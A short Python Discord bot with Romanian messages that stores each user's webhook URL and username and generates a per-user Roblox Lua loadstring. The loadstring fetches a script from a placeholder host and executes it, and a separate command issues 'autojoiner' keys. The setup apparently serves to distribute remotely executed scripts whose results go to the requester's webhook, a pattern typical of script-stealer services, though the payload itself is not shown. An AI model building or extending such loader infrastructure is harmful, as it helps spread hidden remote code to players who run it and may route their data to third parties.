import discord
from discord.ext import commands
from config import DISCORD_BOT_TOKEN
from db import set_webhook, set_username, generate_script, generate_autojoiner_key, create_user_if_not_exists

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="/", intents=intents)

@bot.event
async def on_ready():
    print(f"✅ Bot conectat ca {bot.user}")

@bot.command()
async def setwebhook(ctx, url: str = None):
    if not url:
        return await ctx.send("⚠️ Folosește: `/setwebhook <url>`")
    create_user_if_not_exists(ctx.author.id)
    set_webhook(ctx.author.id, url)
    await ctx.send("✅ Webhook setat!")

@bot.command()
async def setusername(ctx, username: str = None):
    if not username:
        return await ctx.send("⚠️ Folosește: `/setusername <username>`")
    create_user_if_not_exists(ctx.author.id)
    set_username(ctx.author.id, username)
    await ctx.send("✅ Username setat!")

@bot.command()
async def generate(ctx):
    unique_id, script = generate_script(ctx.author.id)
    loadstring = f'loadstring(game:HttpGet("https://your-api.com/scripts/{unique_id}"))()'
    await ctx.send(f"🆔 ID: `{unique_id}`\n\n📜 Loadstring:\n```lua\n{loadstring}\n```")

@bot.command(name="generate-autojoiner")
async def generate_autojoiner(ctx):
    key = generate_autojoiner_key(ctx.author.id)
    await ctx.send(f"🔑 AutoJoiner key generat:\n`{key}`")

bot.run(DISCORD_BOT_TOKEN)
